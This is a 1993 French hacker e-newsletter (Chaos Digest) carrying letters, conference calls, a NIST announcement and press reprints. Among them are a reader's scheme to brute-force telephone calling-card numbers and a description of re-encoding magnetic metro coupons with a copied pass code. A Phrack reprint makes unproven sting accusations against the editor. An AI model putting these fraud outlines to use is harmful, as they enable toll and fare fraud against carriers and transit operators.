faciles a utiliser et dotes d'ecrans d'aide.


Comment fonctionnent-ils?

La reconstruction des mots de passe est realisee par la correlation des
divers modeles statistiques avec les configurations frequentes du fichier
crypte. Cette methode d'analyse d'un fichier pour determiner un mot de
passe inconnu est appele analyse cryptique.


Quand utiliser les PRMP?

Pour le niveau de securite moyen necessite par la plupart des societes, la
protection par un mot de passe est suffisante. Cela peut empecher le
personnel de "fouiner" dans des fichiers auxquels il ne doit pas avoir
acces. Chaque profession a des informations ne devant pas etre accessibles
a l'ensemble du personnel. Rapports personnels, informations sur les
salaires, memos confidentiels ou autres, peuvent etre rendus inaccessibles
a des yeux indiscrets mais restent accessibles aux presonnes autorisees.
Ces securites quotidiennes dont la plupart des entreprises ont besoin, font
des PRMP des outils indispensables pour chaque responsable bureautique.


Qui peut utiliser les PRMP?

Les PRMP representent une mesure de securite pour se proteger contre les
utilisateurs non autorises. Chaque copie a son propre et unique code de
securite. Cela permet aux programmes d'etre stockes sur n'importe quel
reseau ou disque dur sans risque d'acces non autorise.

Avant que la recuperation de mot de passe commence, le code de securite
doit etre entre. S'attribuer le code de securite confidentiel permettra
d'etre la seule personne a avoir acces au logiciel, eliminant ainsi toutes
chances pour les personnes non autorisees de retrouver les mots de passe.


Securite supplementaire

Certaines organisations pourraient etre concernees par l'utilisation des
PRMP par des personnes non autorisees. Pour cette raison un caractere de
securite a ete choisi qui, s'il est inclu dans le mot de passe, empechera
le PRMP de reveler le mot de passe. Cela permet de proteger completement
contre un acces non autorise.


Les PRMP: des logiciels multilangues

Les PRMP ont ete utilises avec succes pour retrouver des documents ecrits
en francais, allemand, italien, espagnol et portugais. Les mots de passe
contenant des caracteres comme un "a" accent grave ou un "c" cedille
pourraient etre retrouves avec succes. Veuillez nous contacter pour les
autres langues et jeux de caracteres.


Systeme requis

MS-Dos 3.0 ou suivants, 256 Ko memoire vive (RAM)
Lecteur de disquette 3 1/2" ou 5 1/4"


Limitations

Ces produits sont prevus pour utiliser des mots de passe allant jusqu'a 36
caracteres. Si vous avez besoin d'utiliser des mots de passe plus longs,
veuillez nous contacter.


     "N'hesitez pas a nous demander la disquette de demonstration"


          >>> Un verrou n'est pas un verrou sans une cle! <<<


|Tous les noms des produits sont la propriete et les noms de marque de   |
|leurs auteurs (sic). Toute l'information est supposee correcte au moment|
|de l'impression. ANDA n'accepte aucune responsabilite pour toute non    |
|conformite et les specifications peuvent changer sans preavis.          |

------------------------------

End of Chaos Digest #1.06
************************************

Chaos Digest               Lundi 8 Fevrier 1993        Volume 1 : Numero 7

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.07 (8 Fev 1993)
File 1--De l'origine du premier e-journal francais, ChaosD
File 2--Comment ecrire a Clinton a la Maison Blanche?
File 3--ICVC'93: Premiere conference bulgare sur les CPA's
File 4--Proposition de nouvel "C2 Orange Book" aux USA
File 5--Phreacking: Est-ce realisable?
File 6--Attention au CCCF (Reprint)
File 7--Re: NTPASS, module chargeable sous NetWare
File 8--Reaction sur "The Little Black Book of Computer Virus"

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also
may be obtained from the mail server at jbcondat@attmail.com: all incoming
messages containing "Request: ChaosD #x.yy" in the "Suject:" field are
answered (x is the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Feb  2 08:01:27 EST 1993
From: 441495@ACADVM1.UOTTAWA.CA (MICHAEL STRANGELOVE )
Subject: File 1--De l'origine du premier e-journal francais, ChaosD


I find it amazing that the first e-serial in France should only just
appear in 1993, considering the size and age of Minitel. Does anyone
have any comments on why this should be so?

Michael Strangelove
Department of Religious Studies
University of Ottawa

         BITNET: 441495@Uottawa
         Internet: 441495@Acadvm1.Uottawa.CA
         S-Mail: 177 Waller, Ottawa, Ontario, K1N 6N5 CANADA
         Voice:  (613) 747-0642
         FAX:    (613) 564-6641

+++++

Date: Tue Feb  2 13:34:36 EST 1993
From: JQRQC%CUNYVM.BITNET@VTVM1.CC.VT.EDU (Joe Raben )

It just seems to me, Michael, that French >academics< are less turned on to
netting than other nationalities, and they may not see Minitel as a meaningful
>scholarly< medium. While SCHOLAR had at latest count 67 subscribers in
Britain, 83 in Canada, 49 in the Netherlands, 31 in Australia, and 18 in
Japan, only 6 have signed up so far in France, and my associates there ask me
to send them faxes!

+++++

Date: Thu Feb  4 08:54:04 EST 1993
From: guedon@ERE.UMontreal.CA (Guedon Jean-Claude )

There is a second answer to Joe Raben's: to publish on Minitel, one
had to have a periodical number, which explains why so many initial Minitel
services were connected with well known publications such as Le Monde, etc...
This was in response to the newspapeprs's fear of being faced with unfair
competition from the new electronic medium and, in fact, some went so far
as to claim that this was a plot to destroy freedom of the press by
destroying the newspapers themselves. In order to reassure them, the
government forced initial publishers on Minitel (I am using the word
"publisher" in an extrapolated meaning, of course) to be connected with
an existing publication.

I don't know if this policy is still in force.

------------------------------

Date: Wed, 20 Jan 93 05:32 GMT
From: 0004381897@mcimail.com (David Daniels )
Subject: File 2--Comment ecrire a Clinton a la Maison Blanche?


It is only fitting that this happened on the eve of tomorrow's presidential
inauguration: I sent a message today to the Clinton Transition Team and got
the following response.  Does this mean that they are not keeping up with
their e-mail?  So much for electronic democracy!!!  :-)

TO:      * David Daniels / MCI ID: 438-1897
Subject:   Non delivery notification

Message [...] sent Tue, Jan 19, 1993 07:16 PM EST, could not be delivery to:
To:  Clinton Transition Team
     EMS: CompuServe
     MBX: [75300,3115]

for the following reasons:

    Mail Delivery Failure. No room in mailbox.

----- Returned message -----

+++++

Date: Thu, 28 Jan 1993 18:12:46 GMT
From: barrett@forge.gatech.edu (James Barrett )

>    Mail Delivery Failure. No room in mailbox.

This is because Jock Gill who handles Email for Clinton was at the
inauguration and not near his computer for a week.  The link is back up and
generating *lots* of mail (press releases) from Clinton.

+++++

Date: Fri, 29 Jan 1993 20:32:42 GMT
From: schneier@chinet.chi.il.us (Bruce Schneier )

The White House is on-line.  Send mail to them at:

        75300.3115@Compuserve.COM

Bruce

****************************************************************************
* Bruce Schneier                                                           *
* Counterpane Systems         For a good prime, call 391581 * 2_216193 - 1 *
* schneier@chinet.chi.il.us                                                *
****************************************************************************

+++++

Si les americains ne cessent de discuter de l'etat de sante des boites-aux-
lettres electroniques de Bill Clinton (ici dans RISKS #14-29/30 et dans
"Computer Privacy Digest" #2.013, Thierry Platon, dans un papier "Download
et e-Mail: la tour de Babel" de son dossier _Les BBS_ ("InfoPC", decembre
1992, no. 87, page 208) ecrit beaucoup mieux:

         Aux Etats-Unis toutefois, on n'utilise pas de code de pays, mais
    plutot des codes correspondant au type de message: .com s'il provient
    d'une entreprise commerciale, .edu pour une universite  ou une ecole,
    .org pour une organisation non commerciale,  .mil pour l'armee, . gov
    pour le gouvernement (Bill.Clinton@whitehouse.gov est une adresse va-
    lable!), etc.

Nous n'avons pas manque de transmettre nos felicitations a Bill Clinton par
un message chaleureux a l'adresse indique. Il nous est revenu avec un
commentaire:

    Your mail to whitehouse.gov is undeliverable.
    whitehouse.gov: unknown host

Mais l'auteur, soucieux de ne pas laisser le lecteur dans une douce ignorance
recidive de plus belle:

    [...] Certains types de BBS commerciaux americains peuvent relier  ce
    type de e-Mail. C'est le cas de CompuServe, par exemple, ou un utili-
    sateur reference 72241,407 aura pour code   72241,407@Compuserve.com.

Thierry Platon n'a jamais utilise de messageries reliees a InterNet. Dans le
cas cite, l'adressage exact pour la plupart des routeurs est particulier. Sur
ATT-Mail, la syntaxe aurait ete:

                      mhs!csmail!72241.4079

Il saurait aussi que les virgules sont interdites en adressage... et qu'
Atlas400 de Transpac n'est pas connecte a InterNet.

Qui me dira pourquoi?

------------------------------

Date: Tue, 02 Feb 93 17:48:55 +0000
From: icvc93@acmbul.bg (Organizing Comitee )
Subject: File 3--ICVC'93: Premiere conference bulgare sur les CPA's


              C A L L        F O R      P A P E R S

   ACMBUL's FIRST INTERNATIONAL COMPUTER VIRUS PROBLEMS AND
                  ALTERNATIVES CONFERENCE

           5-8 April, 1993     -     Varna, Bulgaria

The   purpose  of  the  1993  International  Computer  Virus
Conference is to provide  a  forum  for  anti-virus  product
developers,   researchers   and   academicians  to  exchange
information  among  themselves,  students  and  the  public.
ICVC'93  will  consist of open forums, distinguished keynote
speakers, and  the  presentation  of  high-quality  accepted
papers.   A  high degree of interaction and discussion among
Conference participants  is  expected,  as  a  workshop-like
setting is promoted.

Because   ICVC'93   is   a  not-for-profit  activity  funded
primarily  by  registration  fees,  all   participants   are
expected to have their organizations bear the costs of their
expenses and registration.  Accomodations will be  available
at reduced rates for confernece participants.

WHO SHOULD ATTEND

The   conference   is   intended   for   computer   security
researchers,  managers,  advisors,  EDP  auditors,   network
administrators,  and help desk personnel from government and
industry,  as   well   as   other   information   technology
professionals interested in computer security.


CONFERENCE THEME

This  Conference,  devoted  to advances in virus prevention,
will encompass developments in  both  theory  and  practice.
Papers   are   invited   in  the  areas  shown  and  may  be
theoretical, conceptual, tutorial or descriptive in  nature.
Submitted  papers  will  be refereed, and those presented at
the Conference will be included in the proceedings.


Possible  topics  of  submissions  include,  but   are   not
restricted to:

 o  Virus Detection                    o  Virus Trends and Forecast
 o  Virus Removal                      o  Virus Prevention Policies
 o  Recovering from Viruses            o  Incident Reporting
 o  Viruses on various platforms       o  Emergency Response
    (Windows, Unix, LANs, WANs, etc.)  o  Viruses and the Law
 o  Virus Geneology                    o  Education & Training


THE REFEREEING PROCESS

All  papers  and  panel proposals received by the submission
deadline and which  meet  submission  requirements  will  be
considered for presentation at the Conference.

All  papers  presented  at  ICVC'93  will be included in the
Conference proceedings, copies of which will be provided  to
Conference  attendees.   All  papers presented, will also be
included in proceedings to be published by the ACMBUL.


INSTRUCTIONS TO AUTHORS

        [1]  Two (2) copies of the full paper, consisting of
up-to   20   double-spaced,   typewritten  pages,  including
diagrams, must be received no later than 28 February 1993.

        [2]  The language of the Conference is English.

        [3]  The first page of the manuscript should include
the title of the paper, full  name  of  all  authors,  their
complete   addresses   including  affiliation(s),  telephone
number(s) and e-mail address(es), as well as an abstract  of
the paper.


IMPORTANT DATES

    o Full papers to be received in camera-ready form by the
Organizing Committee by 28 February 1993.

    o  Notification of accepted papers will be mailed to the
author on or before 10 March 1993.

    o Conference:  5-11 April 1993,  St. Konstantine Resort,
Varna, Bulgaria


WHOM TO CONTACT

Questions  or  matters  relating  to  the Conference Program
should be directed to the ACMBUL:

        ICVC'93
        Attn:  Mr. Nickolay Lyutov
        ACMBUL Office
        Varna University of Economics
        77 Boris I Blvd, 9002 P.O.Box 3
        Varna
        Bulgaria

Phone/Fax:  (+35952) 236-213
E-mail: ICVC93@acmbul.bg

icvc93@acmbul.bg (Organizing Comitee)
ACMBUL -- Bulgarian Chapter of ACM

icvc93@acmbul.bg (Organizing Comitee)
ACMBUL -- Bulgarian Chapter of ACM

-------------------

Date: Thu Feb  4 10:31:32 EST 1993
From: lynch@csmes.ncsl.nist.gov (nicki lynch )
Subject: File 4--Proposition de nouvel "C2 Orange Book" aux USA


CONTACT:
Nickilyn Lynch
Computer Scientist, National Computer Systems Laboratory
National Institute of Standards and Technology (NIST)


The **PRELIMINARY DRAFT** of the U.S. Federal Criteria for Information
Technology Security (FC) (which will eventually replace the "Orange Book")
is available on-line.  The files are located on the NIST Computer Security
Bulletin Board.  When printed out, both volumes of the document total
approximately 280 pages double-sided.

By the second week of February, the FC (without the figures) should be
available in ASCII format at that site.  The figures will also be available
individually in postscript form.

What follows are instructions on how to download the files from the site,
how to register your name for announcements, and how to send in comments.

+++++

TO DOWNLOAD THE FILES FROM NIST'S BBS

The following information is on obtaining the draft Federal Criteria from
the NIST BBS in electronic form.  Please use these instructions for
obtaining the files:

You can obtain the files three ways:

  * anonymous ftp (PostScript):

    ftp to csrc.nist.gov (129.6.54.11)
    user anonymous
    password 
    cd pub/nistpubs
    get fcvol1.ps, get fcvol2.ps
    quit

  * e-mail (PostScript)

Send the following message only to docserver@csrc.nist.gov (no subject
line necessary, use lower case):
     send fcvol1.ps
     send fcvol2.ps
The files will be e-mailed to your account.

[Moderateur: J'ai fait la demande par un simple message internet et j'ai
recu 3 fichiers: un accuse de reception de ma demande de 1,3K et deux fichiers
PostScript de 1012K et 894K]

  * via a BBS and a modem (PostScript compressed w/ PKZIP)

Set parameters to 8 bit characters, no parity, 1 stop bit.
For 9600 BPS, dial 1-301-948-5140
For 2400 BPS, dial 1-301-948-5717
If not a registered user, follow instructions for registering.
Go to Files section, follow instructions for Downloading, file
names are fcvol1.zip, fcvol2.zip (files are compressed using the
PKZIP utility, which can also be downloaded here, filename is
pkz110.exe)

+++++

REGISTERING YOUR NAME

When you receive an electronic copy of the draft FC, please send us
you name, mailing address, telephone, and e-mail address to the e-
mail address listed below and state that you have an electronic
copy of the FC. If you distribute the document to additional people
in your organization, please send us the same information on those
people as well.  We will put the names into our database for any
further announcements, meeting notices, draft announcements, etc.,
related to the effort.  NIST will be sending out a LIMITED NUMBER
of hard copies, but due to the substantial expense of sending out
such a large document--even at book rate, we would prefer people
to receive the document electronic means.  Therefore, by sending us
your name and the names of those in your organization who have
the downloaded copies of the document, it saves us from having to
send additional hard copies.

+++++

COMMENTS

We are soliciting TECHNICAL, SUBSTANTIVE comments on the document.
The deadline for comments is:

                          March 31, 1993

All those who contribute substantive comments will be invited to a two-day
workshop at the end of April 1993 to resolve the comments.  The workshop
will be held in the Washington-Baltimore area in a to-be-announced
location.

Please send your comments to:

                     lynch@csmes.ncsl.nist.gov

or, if you prefer, you can send us a 3.5" or 5.25" diskette in
MSDOS or UNIX format (please indicate which) to:

                     Federal Criteria Comments
                     ATTN: Nickilyn Lynch
                     NIST/CSL, Bldg 224/RM A241
                     Gaithersburg, MD  20899

We would prefer to receive electronic copies of comments and/or
name registrations, but we will also receive hardcopy comments/name
registrations at this same address. You can also contact us via
the following fax:

                        FAX: (301) 926-2733
(please note that this number will be active starting in March)

Thank you in advance for your interest in this effort.

Federal Criteria Group
National Institute of Standards and Technology

--------------------

Date: Tue Feb  2 11:41:25 EST 1993
From: TAWED%ETSU.bitnet@CUNYVM.CUNY.EDU (Ed Street )
Subject: File 5--Phreacking: Est-ce realisable?


Hey!!!!
I just recently came up with a way that we here could hack our way into the
telephone system.  It involves dialing a long distance number and placing a
counter on the calling card number, if the card number is valid then there
is silence, if it's invalid then it returns a busy line.

I think that a computer with a modem could be programed to dial a selected
number and then place a counter on the calling card number, dial the two and
see if it's busy or not.  If it's busy then cycle to the next card number. A
very simple algorithm.  I was talking to one of my friends that works for the
press and he asked if it was realistic.  I think that it would be.  But the
only problem is that there is 9 digits to the calling card number. :-(

That's 999,999,999 possibilities! this part seems that it would be
unrealistic. What do you think?? Think that it could take a long time or a
short time.  I even thought about getting together a hacking squad, assign a
range to each one to break up the time that it would take.

My friend in the press said that for anyone to believe it I would need proof,
a few simple numbers would sufice.

Any comments??

ed.
East Tennessee State University

--------------------

Date: Mon Dec 28 22:36:51 -0500 1992
From: server@stormking.com (Storm King ListServ Account )
Subject: File 6--Attention au CCCF (Reprint)
Copyright: Phrack, Inc., 1992

                                ==Phrack Inc.==

                   Volume Four, Issue Forty-One, File 2 of 13

+++++
From: Synaps a/k/a Clone1 a/k/a Feyd
Date: September 2, 1992
Subject: Remarks & Warning!

Hi,

I've been a regular reader of Phrack for two years now and I approve fully the
way you continue Phrack.  It's really a wonderful magazine and if I can help
its development in France, I'll do as much as I can!  Anyway, this is not
really the goal of my letter and excuse me for my English, which isn't very
good.

My remarks are about the way you distribute Phrack.  Sometimes, I don't
receive it fully.  I know this is not your fault and I understand that (this
net sometimes has some problems!).  But I think you could provide a mail
server like NETSERV where we could get back issues by mail and just by MAIL
(no FTP).

Some people (a lot in France) don't have any access to international FTP and
there are no FTP sites in France which have ANY issues of Phrack.  I did use
some LISTSERV mailers with the send/get facility.  Could you install it on
your LISTSERV?

My warning is about a "group" (I should say a pseudo-group) founded by Jean
Bernard Condat and called CCCF.  In fact, the JBC have spread his name through
the net to a lot of people in the Underground.  As the Underground place in
France is weak (the D.S.T, anti-hacker staff is very active here and very
efficient), people tend to trust JBC.  He seems (I said SEEMS) to have a good
knowledge in computing, looks kind, and has a lot of resources.  The only
problem is that he makes some "sting" (as you called it some years ago)
operation and uses the information he spied to track hackers.  He organized a
game last year which was "le prix du chaos" (the amount of chaos) where he
asked hackers to prove their capabilities.

It was not the real goal of this challenge.  He used all the materials hackers
send him to harass some people and now he "plays" with the normal police and
the secret police (DST) and installs like a trade between himself and them.
It's really scary for the hacking scene in France because a lot of people
trust him (even the television which has no basis to prove if he is really a
hacker as he claims to be or if he is a hacker-tracker as he IS!).
Journalists take him as a serious source for he says he leads a group of
computer enthusiasts.

But we discovered that his group doesn't exist.  There is nobody in his group
except his brother and some other weird people (2 or 3) whereas he says there
is 73 people in his club/group.  You should spread this warning to everybody
in the underground because we must show that "stings" are not only for USA!
I know he already has a database with a lot of information like addresses and
other stuff like that about hackers and then he "plays" with those hackers.

Be very careful with this guy.  Too many trust him.  Now it's time to be
"objective" about him and his group!

Thanks a lot and goodbye.

         Synaps a/k/a Clone1 a/k/a Feyd

------------------------------

Date: Fri Feb  5 06:12:29 GMT 1993
From: Chantal CARTON, Novell (fax: 146989461)
Subject: File 7--Re: NTPASS, module chargeable sous NetWare


Cher Monsieur,

Le programme NTPASS pour lequel vous nous demandez notre avis est un NLM,
c'est a dire un module chargeable dynamiquement de NetWare v3.11. Pour l'
installer, il faut donc suivre le processus suivant.

- Il faut tout d'abord  avoir acces physique au serveur.  Nous  tenons  a
vous rappeler que les normes de securite C2 exigent  que l'acces au  ser-
veur soit protege et tout administrateur de reseau qui assure la securite
de son reseau met un acces physique sur les serveurs.

- Il faut ensuite avoir un acces logique au serveur:  NetWare  permet  de
verrouiller la console par un mot de passe.  Encore une fois cette  fonc-
tionnalite est utilise par  tous les administrateurs  et  superviseurs de
reseau quotidiennement.

- Il faut ensuite appeler "AccessData" qui demande le numero de serie  de
NetWare et le numero de serie de NT PASS et qui alors, finalement,  deli-
vre une cle d'acces. Ceci permet de changer  (et non de  restituer  comme
semble le faire croire l'article)  tous les mots de passe:  ceci fait une
difference fondamentale car toute personne du reseau s'en rend compte im-
mediatement.

Qui, dans une societe,  connait le numero de serie du systeme d'exploita-
tion NetWare a l'exception de l'administrateur ou du superviseur?

Donc, en resume, un utilisateur, a partir de son porte  NE PEUT PAS  ins-
taller ce logiciel et briser  la securite de  NetWare.  Si les normes  de
securite les plus elementaires sont respectees  (surtout la premiere), ce
logiciel n'est pas utilisable.

Par contre,  l'objectif initial de ce produit est respecte.  En effet, il
permet a un administrateur qui aurait oublie le mot de passe  superviseur
et qui n'aurait pas cree d'equivalent superviseur  (et cela arrive...) de
se recreer un nouveau mot de passe pour retrouver l'acces a son serveur.

En esperant que ces elements repondent a votre question et restant a  vo-
tre disposition  pour tout renseignement complementaire,  je vous prie de
croire, Monsieur, a l'expression de mes sentiments les meilleurs.


Chantal CARTON-DEMAZURE
Directrice du Marketing

------------------------------

Date: Sun Jan 10 13:00:58 -0500 1993
From: jbcondat@ATTMAIL.COM (Chaos Computer Club France )
Subject: File 8--Reaction sur "The Little Black Book of Computer Virus"
Copyright: ComputerWorld, 1992


 Virus fighters fume over little black book
 Debate rages over merits of publishing codes
 Byline:  James Daly, CW Staff
 Journal:  Computerworld        Page Number:  4
 Publication Date:  June 29, 1992

 A  little  book  is  rattling  a  lot  of  chains in the computer security
business these days. A little black book, to be exact.

     Only  two weeks after being picked up by a small publishing house, The
Little Black Book of Computer Viruses has initiated as nasty and divisive a
free speech battle as this community has seen.

     That  is  because  the  178-page  ebony  volume  is  chock full of the
necessary source code for creating potentially destructive viruses. And for
$15,  the  less  technically inclined can simply send in a coupon and order
floppy disks already loaded with compiled and executable virus programs.

    Anger flames

    Professional  virus  fighters such as Alan Solomon at S&S International
are  madder  than  angry hornets over the publication. They are encouraging
anti-black  book  campaigns  that  include  picketing  author Mark Ludwig's
house,  boycotting  shops that sell the book, petitioning Congress and even
bringing in lawyers.

     Others  said  the  book  is relatively harmless because any hacker who
really  wants  to  get  virus  source  code  only has to dial up one of the
innumerable hacker bulletin boards to quickly and easily download dozens of
viruses.

     Critics   dismissed   Ludwig's   First   Amendment   defense   as  the
computational equivalent of yelling ''fire'' in a crowded movie theater.
    Inherently 'evil'

    ''Any  virus,  by its nature, is evil, and Ludwig presents sample after
sample  of  ways  to  go  about  writing damaging code,'' said David Stang,
chairman  of the International Computer Security Association in Washington,
D.C.

     ''The  fundamental  attraction of computers is that we can understand,
control  and  predict  what they do,'' he added. ''We do not want that data
messed with, but Ludwig seems to think it's okay.''

     Not  true, according to Ludwig, who claimed the purpose of the book is
not destructive but educational.

     ''Computer  viruses  are  not  evil,  and  programmers have a right to
create  them, possess them and experiment with them,'' Ludwig said. ''These
viruses  are  designed  so  that security people can see what a virus looks
like  and  how  it  behaves.  How  can anyone realistically be in charge of
security without having ever seen a virus?''

     The  book's  jacket  cautions that those who misuse its viruses can be
held  legally  liable,  even  if the misuse is unintentional. Additionally,
Ludwig  said,  the  viruses  in the book are protected by copyright law and
anyone  who  uses them without his permission will be subject to both civil
and criminal prosecution.

     Stang  has suggested that if Ludwig's altruistic claims are true, then
he  should  offer  to  donate  the  proceeds  from The Little Black Book of
Computer Viruses to a fund that would fight the spread of damaging computer
viruses.

     Others have suggested that Ludwig should have included ''pseudo-code''
versions  of  the viruses, which contain enough information to illustrate a
point without providing a full working virus.

    First in a series

    The  book is scheduled to be the first in a series of three books about
computer  viruses.  Ludwig  first  published the book himself last year and
became  its  primarily  salesman  after  it was reportedly turned down by a
succession of publishers.

     The  Upland, Pa.-based Diane Publishing Co. picked up the distribution
rights to The Little Black Book of Computer Viruses earlier this month.

     ''We  see  nothing  wrong with it,'' Diane Publishing President Herman
Baron  said. ''We put it out for the simple reason that it fits in with our
catalog of computer security books.''

------------------------------

End of Chaos Digest #1.07
************************************

Chaos Digest               Lundi 15 Fevrier 1993        Volume 1 : Numero 8

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.08 (15 Fev 1993)
File 1--Fausses Cartes Orange Pour le Metro Parisien
File 2--L'ordinateur de la RATP a piege les faussaires (reprint)
File 3--Congres International Russe, CSAM'93
File 4--Donnees Secretes sur les Reserves Cambiales Bresiliennes
File 5--Incident du Vol de Disquettes (lettre)
File 6--Reactions sur "The Little Black Book of Computer Virus"

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud
        * red.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Fri Feb 12 11:08:54 CST 1993
From: ts%operations%france@bangate.compaq.com (Thierry Steinberg )
Subject: File 1--Fausses Cartes Orange Pour le Metro Parisien
Copyright: Agence France Presse, 1993


  Divers escroquerie -  Interpellation de "petits genies" de
l'informatique dans une escroquerie aux coupons de cartes oranges-
PARIS, 11 fev  93 (250 MOTS)

  David, Guillaume et Stephane, ages de 21, 22 et 23 ans, dont l'un
est un "petit genie" de l'informatique, ont ete interpelles, ces
derniers jours, en region parisienne, soupconnes d'avoir reencode,
grace a l'informatique, des coupons de cartes oranges afin de les
revendre, a-t-on appris jeudi de source policiere.

  Depuis quelques mois, selon les enqueteurs du Commissariat des
reseaux ferres parisiens (CRFP), ils revendaient, a la cadence de
cinquante par mois, ces coupons 250 francs piece, utilisables souvent
tres longtemps (la carte orange est generalement utilisee
mensuellement).

   Chez Stephane, etudiant en informatique, interpelle mardi soir, a
Vaureal (Val-d'Oise), les policiers ont notamment retrouve pres de
150.000 francs en especes provenant de cette escroquerie presumee, un
lot de materiel informatique dernier-cri, un scanner, de faux
coupons, 150 de ceux-ci vierges et un fusil.

      La RATP avait depose plainte, le 18 janvier, apres avoir
constate, par exemple, a la lecture des bandes informatiques
recensant les donnees de chaque ticket de carte orange des usagers de
la region parisienne, qu'un de ceux-ci , repondant au meme code,
avait ete utilise... 7.000 fois par jour, principalement a la gare
Saint-Lazare, aux tourniquets automatiques validant les billets et
permettant l'acces aux quais.

   Une quinzaine de personnes ont ensuite ete interpellees, ce qui a
permis de remonter aux trois "experts" presumes qui ont tous ete
deferes a la 8eme section du parquet de Paris.
   rb/jmg

------------------------------

Date: Fri Feb 12 18:30:04 GMT 1993
From: SBROWN@Kentvm.Kent.edu (Steven R Brown )
Subject: File 2--L'ordinateur de la RATP a piege les faussaires (reprint)
Copyright: Charles Desjardins, France Soir, 1993


         LES FAUSSES CARTES ORANGE ETAIENT PRESQUE PARFAITES

       Trois bidouilleurs rechargeaient des coupons pour 250 F

     "N'importe quelle officine informatique est en mesure de realiser
cette manip'",commente un specialiste des bidouillages electroniques en
tout genre. Deja poursuivi pour fraudes informatiques, il prefere garder
l'anonymat pour commenter le principe de cette "escroquerie a la carte
orange".

     "C'est un probleme de codage. J'ai deja vu realise une demonstration
assez proche sur les cartes bleues." Premiere etape: "identifier le code
utilise sur les tickets de la RATP".  Il est compose d'une serie de
caracteres alphanumeriques (chiffres, lettres ou symboles) enregistres
sur la bande magnetique situee au dos de chaque coupon.

     "Pour le lire, il existe des appareils type lecteur de badge de
securite." A ce stade, le but est d'obtenir la visualisation de la chaine
de caracteres sur un ecran. Mais la difficulte consiste a faire le tri
entre les differentes versions possibles.

     17 COMBINAISONS

     "Pour les codes-barres, par exemple, il en existe dix-sept
differents". Ils repondent chacun a des noms compliques comme le "Barcode-
WH39" ou le "code 39 simple".

     Le reve du fraudeur est bien sur d'obtenir ce renseignement
directement, par un complice travaillant dans l'entreprise, et de s'equiper
en consequence d'un lecteur de codes adapte. "Sinon, il faut bricoler, mais
cela reste possible", confie notre expert.

     Une fois la chaine de caracteres revelee, il ne reste plus qu'a la
reproduire sur d'autres tickets. C'est la seconde phase. "Il existe des
appareils d'encodage qui peuvent magnetiser la partie centrale du ticket et
y imprimer un nouveau code."

     Dans la fraude qui vient d'etre decouverte, les "bidouilleurs" ont
reproduit a l'identique (et a plusieurs milliers d'exemplaires) des vrais
coupons mensuels (de 1re ou de 2e classe et jusqu'a six zones), en
utilisant sans doute un scanner couleur, genre de photocopieuse tres
sophistiquee. De l'aveu meme des policiers, les copies etaient quasi
indecelables, de veritables "vrais-faux".

     Il leur suffisait ensuite d'imprimer au verso de ces tickets vierge la
bande magnetique supportant un code pirate. Celui-ci provenait d'un coupon
annuel, et comportait donc une identification valable douze mois
consecutifs.

     SUSPECT

     L'importance du trafic est a l'origine de sa decouverte. En effet, la
totalite des portillons automatiques de la RATP sont relies a un central
informatique qui enregistre le code du coupon a chaque passage. Ainsi,
lorsqu'un ticket deja usage ou suspect est "lu", il peut etre rejete, voire
absorbe par la machine.

     LA PREUVE

     Le 18 janvier, un controle a fait apparaitre que la meme
identification a ete donnee plusieurs milliers de fois dans la meme
journee. Comme si un seul et meme ticket avait ete utilise a plusieurs
points de passage en meme temps. Preuve evidente de l'escroquerie. L'erreur
des faussaires? Ne pas avoir change de combinaison.

[Moderateur: Le "specialiste des bidouillages electroniques en tous genres"
ou "l'expert" cite par ce journaliste n'est personne d'autre que... le
secretaire general du CCCF. L'anonymat sur son identite semble avoir ete
secretement tenu par le redacteur-en-chef de _France Soir_.]

------------------------------

Date: Fri Feb 12 15:20:42 MET 1993
From: dima@iamk4508.mathematik.uni-karlsruhe.de (Dimitrij Shiriaev )
Subject: File 3--Congres International Russe, CSAM'93


   INTERNATIONAL CONGRESS ON COMPUTER SYSTEMS AND APPLIED MATHEMATICS

                            19-23 JULY 1993

                         ST.PETERSBURG, RUSSIA

           Organized by:
           Center of Modern Communications
                         of St.Petersburg University,
           Russian Local ACM Chapter/St.Petersburg,
           St.Petersburg Education
           Computer Society "Micom-XXI"

